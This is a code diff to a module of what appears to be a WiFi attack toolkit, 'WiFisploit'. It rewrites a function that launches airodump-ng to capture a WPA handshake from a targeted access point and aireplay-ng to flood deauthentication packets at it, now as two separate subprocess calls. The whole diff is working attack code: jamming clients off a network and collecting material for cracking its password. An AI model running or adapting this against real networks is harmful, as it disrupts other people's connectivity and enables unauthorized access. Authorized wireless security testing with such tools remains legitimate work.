@@ -1,6 +1,7 @@
-# WiFisploit\wsf\modules\captures\capture_handshake.py
+# wsf\modules\captures\capture_handshake.py
 
 import os
+import subprocess
 from pystyle import Colors, Colorate
 
 gradient_colors = Colors.red_to_white
@@ -44,7 +45,13 @@ else:
     print(Colorate.Horizontal(gradient_colors, f"Path => {path}"))
 
 os.system(f"iwconfig {interface} channel {channel}")
-os.system(
-    f"xterm -geometry 120x35 -e airodump-ng {interface} --bssid {bssid} -c {channel} -w {path} | "
-    f"xterm -geometry 120x35 -e aireplay-ng --deauth {packet} -a {bssid} {interface}"
-)
+
+subprocess.Popen([
+    "xterm", "-geometry", "120x35", "-e",
+    f"airodump-ng {interface} --bssid {bssid} -c {channel} -w {path}"
+])
+
+subprocess.Popen([
+    "xterm", "-geometry", "120x35", "-e",
+    f"aireplay-ng --deauth {packet} -a {bssid} {interface}"
+])
